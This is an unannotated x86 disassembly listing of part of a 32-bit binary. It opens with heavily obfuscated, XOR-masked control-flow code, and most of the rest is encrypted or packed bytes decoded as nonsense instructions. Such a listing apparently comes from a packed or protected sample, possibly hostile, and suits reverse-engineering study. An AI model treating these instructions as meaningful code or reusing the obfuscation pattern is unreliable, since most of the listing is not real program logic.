  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x430a28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0x86097a6a
  4125d0:	aam    0x42
  4125d2:	sbb    BYTE PTR [ebx+0x7b],dh
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	repz aam 0x98
  4125dd:	jnp    0x41265b
  4125df:	mov    edi,ss
  4125e1:	cmp    al,0x79
  4125e3:	sbb    eax,0x7e5312f8
  4125e8:	retf   0x5f90
  4125eb:	cs (bad) 
  4125ed:	sub    BYTE PTR [ebx],bh
  4125ef:	out    dx,al
  4125f0:	cdq    
  4125f1:	and    BYTE PTR [ebp+0x51],0xa5
  4125f5:	or     eax,0x73097584
  4125fa:	mov    eax,ebx
  4125fc:	(bad)  
  4125fe:	stc    
  4125ff:	dec    ebp
  412600:	inc    edi
  412601:	loop   0x412639
  412603:	cdq    
  412604:	sbb    bh,0xe9
  412607:	mov    ch,0x2e
  412609:	sub    eax,0x475c65d3
  41260e:	sub    DWORD PTR [edx+0x1b0cd246],edx
  412614:	outs   dx,DWORD PTR ds:[esi]
  412615:	cmp    eax,0xbad3e16b
  41261a:	add    dl,bl
  41261c:	fidivr WORD PTR ds:0x2eb167d8
  412622:	js     0x4125cf
  412624:	mov    esi,es
  412626:	jns    0x412688
  412628:	push   ecx
  412629:	test   bl,0xc2
  41262c:	add    BYTE PTR [ebx-0x5c],al
  41262f:	or     al,0xfd
  412631:	pop    ebp
  412632:	adc    eax,0x1d7f7a52
  412637:	pop    esp
  412638:	xor    DWORD PTR gs:[eax+0x4fba42e1],esp
  41263f:	sub    eax,ebp
  412641:	xchg   esi,eax
  412642:	xchg   esp,eax
  412643:	scas   eax,DWORD PTR es:[edi]
  412644:	icebp  
  412645:	inc    ecx
  412646:	cli    
  412647:	pop    esp
  412648:	adc    DWORD PTR [ebp-0x6cd5af4c],esp
  41264e:	inc    ebp
  41264f:	pop    ds
  412650:	hlt    
  412651:	lods   eax,DWORD PTR ds:[esi]
  412652:	mov    ebx,0xe1d4ff4
  412657:	das    
  412658:	sub    DWORD PTR [ecx+0x30],eax
  41265b:	cdq    
  41265c:	mov    es,WORD PTR [eax+edx*4]
  41265f:	sub    ebx,DWORD PTR [ecx+ebp*8-0x3b]
  412663:	mov    cl,0x8d
  412665:	or     al,al
  412667:	jp     0x412615
  412669:	sahf   
  41266a:	push   esi
  41266b:	inc    ebx
  41266c:	cld    
  41266d:	jg     0x4126c8
  41266f:	mov    ebp,0xa416a8c4
  412674:	sub    edx,eax
  412676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412677:	in     al,dx
  412678:	stc    
  412679:	or     ebx,DWORD PTR ds:0x8785c257
  41267f:	inc    ebx
  412680:	inc    eax
  412681:	adc    DWORD PTR [edi+0x48],0xfffffff7
  412685:	mov    al,0x61
  412687:	jmp    0x248b:0x65853108
  41268e:	adc    DWORD PTR [esi-0x55de7ca9],ebx
  412694:	mov    WORD PTR [edx+0x5de890ec],?
  41269a:	scas   eax,DWORD PTR es:[edi]
  41269b:	pop    esp
  41269c:	jl     0x41267c
  41269e:	mov    WORD PTR [edi-0x52],gs
  4126a1:	enter  0xca49,0x90
  4126a5:	das    
  4126a6:	push   0xffffffa5
  4126a8:	push   0x16
  4126aa:	int    0x34
  4126ac:	cmp    dl,dh
  4126ae:	in     eax,0x2
  4126b0:	loopne 0x412702
  4126b2:	add    al,0x57
  4126b4:	inc    esi
  4126b5:	mov    ch,bh
  4126b7:	push   ecx
  4126b8:	mov    esi,0x508d87a3
  4126bd:	dec    esi
  4126be:	and    DWORD PTR [ebx-0x47],edx
  4126c1:	push   cs
  4126c2:	nop
  4126c3:	cwde   
  4126c4:	adc    esi,DWORD PTR [eax]
  4126c6:	and    BYTE PTR [ecx-0x5f],dl
  4126c9:	adc    eax,0x840cf2ae
  4126ce:	jnp    0x41266e
  4126d0:	fld    QWORD PTR [edx-0x76]
  4126d3:	inc    edx
  4126d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126d5:	xor    ebx,0xffffffa0
  4126d8:	leave  
  4126d9:	inc    edx
  4126da:	cmp    ecx,0xa0c99ca3
  4126e0:	mov    dl,0xd9
  4126e2:	lods   al,BYTE PTR ds:[esi]
  4126e3:	not    BYTE PTR [edx-0x30]
  4126e6:	in     al,dx
  4126e7:	sub    edi,esi
  4126e9:	rol    DWORD PTR [esi+eax*4-0xba2d42e],0xe4
  4126f1:	pop    edi
  4126f2:	mov    ds,WORD PTR [edi-0x674bd212]
  4126f8:	retf   0xf0c6
  4126fb:	fistp  WORD PTR [edx+ecx*1+0x3b13b6fb]
  412702:	pop    esi
  412703:	sbb    DWORD PTR [eax+0x6d],esp
  412706:	add    esp,edx
  412708:	fdiv   st(1),st
  41270a:	(bad)  
  41270b:	jg     0x4126e8
  41270d:	pop    ebp
  41270e:	mov    ecx,DWORD PTR [ecx-0x1d76133]
  412714:	dec    eax
  412715:	add    DWORD PTR [eax],esi
  412717:	mov    dl,0x97
  412719:	ins    DWORD PTR es:[edi],dx
  41271a:	scas   eax,DWORD PTR es:[edi]
  41271b:	jg     0x4126de
  41271d:	add    eax,0xfb2f8e50
  412722:	adc    BYTE PTR [esi+0x73],0xb8
  412726:	test   al,0x33
  412728:	lock pop edx
  41272a:	clc    
  41272b:	ret    0x17f7
  41272e:	out    0xa0,al
  412730:	or     eax,0xa4bdadb6
  412735:	add    BYTE PTR [eax-0x32],dh
  412738:	or     dl,BYTE PTR [ebp+0x7c]
  41273b:	ret    0x15a3
  41273e:	je     0x41271e
  412740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412741:	xchg   esi,eax
  412742:	mov    cl,0xdd
  412744:	das    
  412745:	push   0x5e0d95b9
  41274a:	loop   0x412788
  41274c:	sub    ah,BYTE PTR [edi+0x43]
  41274f:	in     eax,0x94
  412751:	pusha  
  412752:	in     eax,dx
  412753:	adc    eax,0x46f02cd
  412758:	js     0x4127b5
  41275a:	out    dx,al
  41275b:	mov    al,ds:0x20138053
  412760:	xlat   BYTE PTR ds:[ebx]
  412761:	outs   dx,DWORD PTR ds:[esi]
  412762:	sub    DWORD PTR [eax-0x497db9e2],edi
  412768:	fadd   DWORD PTR [eax+0x13f33293]
  41276e:	cdq    
  41276f:	inc    ebp
  412770:	pop    ebx
  412771:	jecxz  0x412738
  412773:	mov    ecx,0x8c9a24f
  412778:	add    al,0x11
  41277a:	out    0x33,al
  41277c:	popf   
  41277d:	inc    edx
  41277e:	(bad)  
  412780:	stos   DWORD PTR es:[edi],eax
  412781:	sbb    al,0xf5
  412783:	fiadd  DWORD PTR [ecx+0x1ef70c07]
  412789:	pusha  
  41278a:	xchg   ebp,eax
  41278b:	enter  0x490f,0x87
  41278f:	pop    es
  412790:	or     eax,0xb5127c30
  412795:	xchg   esi,eax
  412796:	jne    0x4127f4
  412798:	sbb    cl,BYTE PTR [esi]
  41279a:	fsubr  QWORD PTR [ecx+0x3e]
  41279d:	js     0x412736
  41279f:	fild   QWORD PTR [edx+0x6991fac9]
  4127a5:	pop    es
  4127a6:	dec    eax
  4127a7:	neg    BYTE PTR [ebp-0x7d]
  4127aa:	inc    DWORD PTR [eax-0x79]
  4127ad:	popf   
  4127ae:	jecxz  0x412733
  4127b0:	in     al,0x77
  4127b2:	(bad)  
  4127b3:	push   0x2f8598bf
  4127b8:	mov    ebp,DWORD PTR [eax+eiz*4]
  4127bb:	clc    
  4127bc:	icebp  
  4127bd:	leave  
  4127be:	mov    ch,0x93
  4127c0:	repz into 
  4127c2:	pop    esp
  4127c3:	push   cs
  4127c4:	out    dx,eax
  4127c5:	in     al,dx
  4127c6:	test   al,0x90
  4127c8:	mov    eax,ds:0x8be6cbd9
  4127cd:	sar    cl,0xf3
  4127d0:	shl    BYTE PTR [ecx],0xc3
  4127d3:	retf   
  4127d4:	jnp    0x4127a7
  4127d6:	scas   al,BYTE PTR es:[edi]
  4127d7:	std    
  4127d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127d9:	mov    eax,ds:0x6349f871
  4127de:	mov    BYTE PTR [ecx+0x20],0xa7
  4127e2:	shl    BYTE PTR [edi+0x55343a08],cl
  4127e8:	fidivr WORD PTR [ecx-0x80]
  4127eb:	nop
  4127ec:	hlt    
  4127ed:	ins    DWORD PTR es:[edi],dx
  4127ee:	stc    
  4127ef:	push   esi
  4127f0:	fldenv ds:0xf028f50d
  4127f6:	dec    edx
  4127f7:	mov    dh,0xeb
  4127f9:	daa    
  4127fa:	mov    edx,0xd6288c1e
  4127ff:	xor    BYTE PTR [eax+0xc],al
  412802:	xchg   esp,eax
  412803:	mov    edi,0x3166f66b
  412808:	sub    al,0x4
  41280a:	test   al,0xfe
  41280c:	adc    eax,0xfac5081e
  412811:	xor    eax,0x33cad61e
  412816:	adc    eax,0x360cbfbc
  41281b:	call   0xa7122386
  412820:	stc    
  412821:	push   edi
  412822:	in     eax,dx
  412823:	ja     0x412850
  412825:	push   ss
  412826:	ds add esi,eax
  412829:	imul   ebx,DWORD PTR [ecx+0x5d3eda76],0xe0f87f5f
  412833:	(bad)  
  412834:	pusha  
  412835:	mov    edx,0xf291afab
  41283a:	xor    edi,DWORD PTR [ebx+0x28]
  41283d:	mov    bl,0xfc
  41283f:	push   ss
  412840:	retf   0x3345
  412843:	mov    dh,0x54
  412845:	loop   0x41283b
  412847:	icebp  
  412848:	mov    ch,0x29
  41284a:	cmp    BYTE PTR [ecx+0x53],0xb4
  41284e:	mov    al,ds:0xca13baf9
  412853:	in     al,0x63
  412855:	xchg   DWORD PTR [ecx-0x78],esi
  412858:	rol    eax,0x6b
  41285b:	imul   ebp,DWORD PTR [eax-0x22],0x9d2e412c
  412862:	int3   
  412863:	cmp    esi,DWORD PTR [eax]
  412865:	xor    DWORD PTR [esi+0x77],0x51
  412869:	pop    esi
  41286a:	pop    ebx
  41286b:	rcr    BYTE PTR [edx],cl
  41286d:	repz xor BYTE PTR [edi+edi*2-0xd],ch
  412872:	popa   
  412873:	jb     0x4128ad
  412875:	(bad)  
  412876:	jb     0x4128b8
  412878:	sbb    al,0xf1
  41287a:	sub    eax,0x37a2d087
  41287f:	int3   
  412880:	xor    BYTE PTR [ebx],0xd3
  412883:	mov    eax,0x43788b87
  412888:	dec    ebp
  412889:	sub    al,0x21
  41288b:	push   esi
  41288c:	xchg   ecx,eax
  41288d:	push   ecx
  41288e:	jmp    0x98b47456
  412893:	inc    esp
  412894:	add    BYTE PTR [edi],bl
  412896:	rcr    bl,0xf0
  412899:	icebp  
  41289a:	jmp    0x4128c1
  41289c:	retf   
  41289d:	imul   esi,DWORD PTR [esi],0xe8b39eae
  4128a3:	xchg   bl,dh
  4128a5:	push   es
  4128a6:	mov    ds:0x1d1a1153,al
  4128ab:	mov    al,0xbd
  4128ad:	or     BYTE PTR [ecx],0x67
  4128b0:	adc    eax,0xb2752309
  4128b5:	fist   WORD PTR [ecx-0x6d]
  4128b8:	ins    DWORD PTR es:[edi],dx
  4128b9:	jmp    0xfcf79226
  4128be:	loop   0x412904
  4128c0:	or     eax,DWORD PTR [ebp-0x26]
  4128c3:	(bad)  
  4128c4:	sbb    DWORD PTR [ebx+0x63],edx
  4128c7:	pop    es
  4128c8:	fucom  st(7)
  4128ca:	repnz adc eax,0x75344f1f
  4128d0:	dec    esi
  4128d1:	mov    BYTE PTR [edi],bh
  4128d3:	jecxz  0x41294b
  4128d5:	data16 jg 0x4128c3
  4128d8:	mov    ah,0xbe
  4128da:	xlat   BYTE PTR ds:[ebx]
  4128db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128dc:	or     eax,0x12cc9e1c
  4128e1:	mov    ebx,0x205dc9e9
  4128e6:	xchg   edx,eax
  4128e7:	mov    DWORD PTR [ebx-0x15fc88e7],ebx
  4128ed:	adc    ecx,ebx
  4128ef:	ret    0xaddc
  4128f2:	ins    BYTE PTR es:[edi],dx
  4128f3:	push   ds
  4128f4:	mov    edx,0x1d394e3b
  4128f9:	(bad)  
  4128fa:	xchg   DWORD PTR [edi+0x29],edi
  4128fd:	cmp    bh,ah
  4128ff:	call   0xe53eba3c
  412904:	popa   
  412905:	mov    WORD PTR [edx],ss
  412907:	pop    ebx
  412908:	stc    
  412909:	dec    ebx
  41290a:	and    al,0x86
  41290c:	(bad)  
  41290d:	fisttp DWORD PTR [ecx-0x12edb121]
  412913:	pushf  
  412914:	push   ss
  412915:	hlt    
  412916:	test   BYTE PTR [eax-0x167335a],ch
  41291c:	sub    eax,0x231d1fd0
  412921:	lods   al,BYTE PTR ds:[esi]
  412922:	cli    
  412923:	(bad)  
  412924:	pop    esi
  412925:	xchg   esi,eax
  412926:	xor    DWORD PTR [edi-0x6b8f0206],esi
  41292c:	lock or al,0xdb
  41292f:	jno    0x41290a
  412931:	sar    BYTE PTR [eax+0x1f85431f],0x6a
  412938:	popf   
  412939:	mov    bl,0x1c
  41293b:	cmc    
  41293c:	outs   dx,BYTE PTR ds:[esi]
  41293d:	adc    BYTE PTR [eax+0x6],bl
  412940:	aam    0x7c
  412942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412943:	pop    edx
  412944:	xlat   BYTE PTR ds:[ebx]
  412945:	pop    esi
  412946:	sbb    esi,DWORD PTR ds:0x1e7d6841
  41294c:	adc    ecx,DWORD PTR [esi-0x24]
  41294f:	ret    0xe362
  412952:	lods   eax,DWORD PTR ds:[esi]
  412953:	test   DWORD PTR [ebx-0x38],ebx
  412956:	cmp    eax,0xbe8ced3a
  41295b:	pop    esp
  41295c:	push   ss
  41295d:	inc    ecx
  41295e:	inc    eax
  41295f:	dec    edx
  412960:	scas   eax,DWORD PTR es:[edi]
  412961:	sbb    ah,ah
  412963:	fst    DWORD PTR [ebx+0x3cb7d7d2]
  412969:	sub    ebp,DWORD PTR [edi-0x6c]
  41296c:	mov    edx,0xd6b77489
  412971:	ins    BYTE PTR es:[edi],dx
  412972:	(bad)  
  412973:	fstp   st(0)
  412975:	pop    esi
  412976:	ja     0x41292f
  412978:	adc    al,0x2d
  41297a:	inc    edi
  41297b:	inc    eax
  41297c:	dec    esp
  41297d:	retf   
  41297e:	or     eax,0x28b4df9b
  412983:	mov    al,ds:0x5bf759ba
  412988:	test   BYTE PTR [edx-0x1e],cl
  41298b:	push   ebx
  41298c:	fbstp  TBYTE PTR [ebx+ebp*1-0x58dc7ab3]
  412993:	popa   
  412994:	push   eax
  412995:	pop    ebx
  412996:	lods   al,BYTE PTR ss:[esi]
  412998:	fisubr WORD PTR [eax+0x1]
  41299b:	pop    ebp
  41299c:	or     DWORD PTR [ebp+0x1b],eax
  41299f:	mov    dl,0x8e
  4129a1:	enter  0xb3de,0xee
  4129a5:	sbb    al,0xc4
  4129a7:	xlat   BYTE PTR ds:[ebx]
  4129a8:	mov    ebx,0xfe5384a6
  4129ad:	rcr    DWORD PTR [ecx],cl
  4129af:	jmp    ebx
  4129b1:	or     dh,BYTE PTR [ebx+0x1ff78177]
  4129b7:	mov    ah,0xd0
  4129b9:	xor    al,0x70
  4129bb:	retf   
  4129bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129bd:	fbld   TBYTE PTR [edi-0x473b68ec]
  4129c3:	scas   al,BYTE PTR es:[edi]
  4129c4:	sti    
  4129c5:	lods   al,BYTE PTR ds:[esi]
  4129c6:	repnz push edi
  4129c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129c9:	mov    edx,DWORD PTR [ebx+0xe]
  4129cc:	nop
  4129cd:	dec    BYTE PTR [ebx]
  4129cf:	jns    0x4129a7
  4129d1:	mov    edx,0xb181619b
  4129d6:	push   es
  4129d7:	repnz dec esp
  4129d9:	and    BYTE PTR [eax],bl
  4129db:	popa   
  4129dc:	adc    edi,DWORD PTR [ebp-0x6]
  4129df:	in     al,dx
  4129e0:	fimul  WORD PTR [esi+edi*2]
  4129e3:	mov    dh,BYTE PTR [eax-0x5ade0db3]
  4129e9:	jg     0x4129d0
  4129eb:	jnp    0x4129e7
  4129ed:	jmp    0x2e03:0x4bf679c1
  4129f4:	sub    al,0xd2
  4129f6:	frstorw [esi+eax*1-0x4c94a8dc]
  4129fe:	icebp  
  4129ff:	lahf   
  412a00:	jmp    0x412a6d
  412a02:	mov    BYTE PTR [edx],ch
  412a04:	add    ecx,edx
  412a06:	das    
  412a07:	stc    
  412a08:	pop    edx
  412a09:	or     ch,BYTE PTR [ebp-0x28ab6b11]
  412a0f:	leave  
  412a10:	or     DWORD PTR [ecx+esi*8-0x7a],eax
  412a14:	cmp    eax,0x902877bd
  412a19:	fmul   DWORD PTR [ebx+0x5fce45f]
  412a1f:	and    DWORD PTR ds:0x6fa29114,ecx
  412a25:	or     al,BYTE PTR [ebp+0x7fce85e]
  412a2b:	imul   esp,DWORD PTR [eax-0x7a],0xffffffa6
  412a2f:	xchg   DWORD PTR [ebx+0x2f],eax
  412a32:	or     al,0xdc
  412a34:	test   eax,0xa9c4adb2
  412a39:	icebp  
  412a3a:	xchg   esp,eax
  412a3b:	ror    DWORD PTR ds:0xe31c5531,cl
  412a41:	aaa    
  412a42:	and    DWORD PTR [edi],esi
  412a44:	push   eax
  412a45:	gs pop ecx
  412a47:	pushf  
  412a48:	jmp    0xc599:0xbfd2417a
  412a4f:	jge    0x412a5f
  412a51:	mov    edx,0x882ffd0f
  412a56:	jnp    0x412a1e
  412a58:	or     DWORD PTR [eax-0x36c9ee8d],0x2d4b7b0b
  412a62:	popf   
  412a63:	xor    BYTE PTR [edx-0x166e15c3],dl
  412a69:	adc    ch,dl
  412a6b:	ret    0x1e7e
  412a6e:	outs   dx,BYTE PTR fs:[esi]
  412a70:	add    ecx,DWORD PTR [esi-0x73693d32]
  412a76:	lahf   
  412a77:	push   eax
  412a78:	mov    al,0xd9
  412a7a:	sub    al,0x4b
  412a7c:	fs aam 0x23
  412a7f:	cmp    dh,BYTE PTR [edi]
  412a81:	and    al,0xe
  412a83:	sbb    ah,BYTE PTR [edx-0x30dd81c5]
  412a89:	lahf   
  412a8a:	retf   
  412a8b:	in     eax,dx
  412a8c:	mov    DWORD PTR [esi+0x1d],esp
  412a8f:	adc    DWORD PTR [ebp-0x3bfe8df1],esi
  412a95:	in     al,0xf9
  412a97:	pop    edi
  412a98:	or     eax,0x15d5d01b
  412a9d:	or     al,0xe4
  412a9f:	nop
  412aa0:	and    ah,BYTE PTR [ebx-0xddf69f6]
  412aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412aa7:	shl    BYTE PTR [eax],cl
  412aa9:	pop    edi
  412aaa:	pop    esi
  412aab:	jmp    0x412a5c
  412aad:	pusha  
  412aae:	and    ah,dh
  412ab0:	xchg   ecx,eax
  412ab1:	or     eax,0xfc55a39d
  412ab6:	pop    ebx
  412ab7:	retf   0xb6f6
  412aba:	hlt    
  412abb:	leave  
  412abc:	mov    eax,ds:0xac86e935
  412ac1:	mov    bh,0x91
  412ac3:	ret    0x2a5a
  412ac6:	cs or  eax,0x5f99ea5
  412acc:	cmp    DWORD PTR [ecx-0x78b1d862],edi
  412ad2:	xchg   ebx,eax
  412ad3:	xor    ch,BYTE PTR [esi+eiz*2]
  412ad6:	xchg   esp,esp
  412ad8:	pop    ss
  412ad9:	(bad)  
  412ada:	ins    BYTE PTR es:[edi],dx
  412adb:	sub    cl,cl
  412add:	pop    ss
  412ade:	mov    WORD PTR [edx],es
  412ae0:	sbb    eax,0x2b5f9b25
  412ae5:	adc    eax,0xb298a7f3
  412aea:	into   
  412aeb:	(bad)  
  412aec:	jl     0x412af0
  412aee:	mov    ebx,0x63ec75f5
  412af3:	add    eax,0x2e411ac0
  412af8:	mov    al,0xd
  412afa:	jns    0x412b10
  412afc:	lea    edi,ds:0xe5bca13e
  412b02:	jbe    0x412aa8
  412b04:	mov    edx,0x5b556cf0
  412b09:	cmp    al,0x59
  412b0b:	es mov al,0x99
  412b0e:	sbb    al,BYTE PTR [edi+0x7cd1fe62]
  412b14:	xchg   BYTE PTR [esi-0x3d],al
  412b17:	lods   eax,DWORD PTR ds:[esi]
  412b18:	mov    bl,0x72
  412b1a:	fld    st(0)
  412b1c:	fstp   QWORD PTR [eax+0x31]
  412b1f:	xor    eax,0x24a4a226
  412b24:	ds mov edx,0xf5f540f7
  412b2a:	adc    edi,DWORD PTR [ecx-0x59cfa5e1]
  412b30:	mov    esp,0x3260bcfe
  412b35:	xor    esp,edx
  412b37:	adc    al,0x37
  412b39:	icebp  
  412b3a:	adc    al,0xff
  412b3c:	cli    
  412b3d:	dec    esi
  412b3e:	(bad)  
  412b3f:	fwait
  412b40:	in     al,dx
  412b41:	adc    al,0xc1
  412b43:	stc    
  412b44:	xchg   edx,edx
  412b46:	je     0x412b01
  412b48:	sbb    esp,edx
  412b4a:	mov    ds:0xbabeef68,eax
  412b4f:	das    
  412b50:	fstp   DWORD PTR [ebx+0x561b89ea]
  412b56:	cmp    eax,0xb7d38f64
  412b5b:	sub    BYTE PTR ds:0xba4a8aa1,bl
  412b61:	(bad)  
  412b62:	push   ds
  412b63:	push   ebx
  412b64:	int3   
  412b65:	pop    edx
  412b66:	into   
  412b67:	imul   ebx,DWORD PTR [ecx+edx*4],0x22
  412b6b:	mov    ebp,0x2f3041b3
  412b70:	outs   dx,BYTE PTR ds:[esi]
  412b72:	sbb    DWORD PTR [eax+0x6a],0xf44e34f2
  412b79:	xor    al,dl
  412b7b:	imul   esi,DWORD PTR [ebx],0xeb8816d9
  412b81:	fcomp  QWORD PTR [edi+ecx*4]
  412b84:	inc    eax
  412b85:	ret    0x353b
  412b88:	and    DWORD PTR [edx+0x7e],eax
  412b8b:	xchg   esp,eax
  412b8c:	mov    esi,0xd9bf2cb7
  412b91:	scas   eax,DWORD PTR es:[edi]
  412b92:	xchg   DWORD PTR [ebx-0x65d53395],ebp
  412b98:	and    al,0x1
  412b9a:	std    
  412b9b:	int    0x25
  412b9d:	(bad)  
  412b9f:	push   cs
  412ba0:	push   ebx
  412ba1:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ba3:	sti    
  412ba4:	adc    al,0xb
  412ba6:	pop    ss
  412ba7:	lar    eax,si
  412baa:	test   eax,0x3e50141
  412baf:	imul   ebp,DWORD PTR [edx-0x46f5473d],0xf779c4ef
  412bb9:	xor    BYTE PTR [esi+ebp*2+0x54a5c73],dl
  412bc0:	test   al,0xfa
  412bc2:	adc    bh,BYTE PTR [ebx-0x39]
  412bc5:	call   0xd0b6:0x47253d3a
  412bcc:	out    dx,eax
  412bcd:	fld    DWORD PTR [eax+0x41bf9226]
  412bd3:	loope  0x412b7a
  412bd5:	xchg   ebp,eax
  412bd6:	stc    
  412bd7:	xor    BYTE PTR [edx],bh
  412bd9:	das    
  412bda:	ds retf 0xcbbf
  412bde:	loop   0x412c3e
  412be0:	cmp    al,0x30
  412be2:	cmp    al,0xc3
  412be4:	sbb    BYTE PTR [edi-0xc],dh
  412be7:	push   0xa8c42a5d
  412bec:	cmp    cl,bh
  412bee:	xor    BYTE PTR [esi-0x7b53ac53],al
  412bf4:	cmp    ebx,esi
  412bf6:	xchg   esi,eax
  412bf7:	dec    eax
  412bf8:	lahf   
  412bf9:	cli    
  412bfa:	fst    st(6)
  412bfc:	sub    eax,DWORD PTR [edi+0x60]
  412bff:	xchg   BYTE PTR [ecx],ch
  412c01:	pop    eax
  412c02:	cmp    dh,BYTE PTR [edi]
  412c04:	es lock addr16 fwait
  412c08:	out    dx,al
  412c09:	mov    esp,0xfb8526b6
  412c0e:	iret   
  412c0f:	pop    ds
  412c10:	jns    0x412c03
  412c12:	js     0x412be9
  412c14:	pop    ss
  412c15:	or     al,0x30
  412c17:	xor    eax,0xbd87cd66
  412c1c:	or     al,0xb4
  412c1e:	jle    0x412c13
  412c20:	add    bh,BYTE PTR [bp+si]
  412c23:	nop
  412c24:	lahf   
  412c25:	dec    edx
  412c26:	sub    edx,0xbd9e9421
  412c2c:	adc    al,0x25
  412c2e:	cmp    al,0x7f
  412c30:	pop    edi
  412c31:	in     al,dx
  412c32:	dec    esi
  412c33:	pop    ss
  412c34:	es jmp 0x9912:0xa9652ba
  412c3c:	add    eax,0x12fa0f26
  412c41:	ins    DWORD PTR es:[edi],dx
  412c42:	mov    eax,ss
  412c44:	mov    ch,0xfa
  412c46:	adc    bh,al
  412c48:	je     0x412c80
  412c4a:	mov    cl,0xce
  412c4c:	add    BYTE PTR [ebx+edx*8+0x6a],dh
  412c50:	inc    edx
  412c51:	mov    bh,0xfe
  412c53:	or     DWORD PTR [ebx],ecx
  412c55:	hlt    
  412c56:	jle    0x412cc2
  412c58:	push   0x8cd3ef90
  412c5d:	xchg   ebp,edx
  412c5f:	stos   DWORD PTR es:[edi],eax
  412c60:	inc    ebp
  412c61:	(bad)  
  412c62:	ss imul esp,edx,0x48
  412c66:	call   0x3b14c114
  412c6b:	inc    ah
  412c6d:	mov    ah,0x33
  412c6f:	pop    ecx
  412c70:	test   eax,0xc0c2fe22
  412c75:	jnp    0x412c4d
  412c77:	aam    0xe7
  412c79:	dec    edx
  412c7a:	enter  0x3c3f,0x85
  412c7e:	push   es
  412c7f:	pop    esp
  412c80:	jae    0x412ca6
  412c82:	cmp    BYTE PTR [edi+eiz*4],0x22
  412c86:	jecxz  0x412c1c
  412c88:	pop    eax
  412c89:	sbb    bl,BYTE PTR [eax-0x605853a4]
  412c8f:	inc    ecx
  412c90:	or     eax,0x852ac787
  412c95:	inc    ebx
  412c96:	ror    dl,cl
  412c98:	aad    0x95
  412c9a:	outs   dx,DWORD PTR ds:[esi]
  412c9b:	inc    eax
  412c9c:	pusha  
  412c9d:	xchg   ebx,eax
  412c9e:	in     eax,dx
  412c9f:	(bad)  
  412ca0:	and    dh,al
  412ca2:	sahf   
  412ca3:	or     eax,DWORD PTR [eax]
  412ca5:	cld    
  412ca6:	das    
  412ca7:	add    BYTE PTR [ebx-0x34d75f1e],cl
  412cad:	movq   mm0,QWORD PTR ds:0xdc908d0d
  412cb4:	jb     0x412c4b
  412cb6:	(bad)  
  412cb7:	jmp    0x412ce6
  412cb9:	ror    ebx,cl
